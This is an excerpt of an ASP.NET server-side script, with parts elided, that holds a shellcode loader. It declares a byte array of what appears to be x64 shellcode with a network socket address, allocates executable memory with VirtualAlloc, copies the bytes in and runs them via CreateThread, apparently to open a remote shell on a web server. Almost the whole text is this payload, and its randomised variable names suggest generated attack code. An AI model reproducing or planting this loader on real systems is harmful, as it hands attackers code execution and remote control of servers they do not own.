...
<script runat="server">
    ...
    {
        byte[] vDm = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
...
0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbd,
...
0x59,0x41,0x89,0xda,0xff,0xd5};
        ...
        IntPtr svFez = VirtualAlloc(IntPtr.Zero,(UIntPtr)vDm.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(vDm,0,svFez,vDm.Length);
        IntPtr bYq2he = IntPtr.Zero;
        IntPtr hDWhQ = CreateThread(IntPtr.Zero,UIntPtr.Zero,svFez,IntPtr.Zero,0,ref bYq2he);
    }
</script>
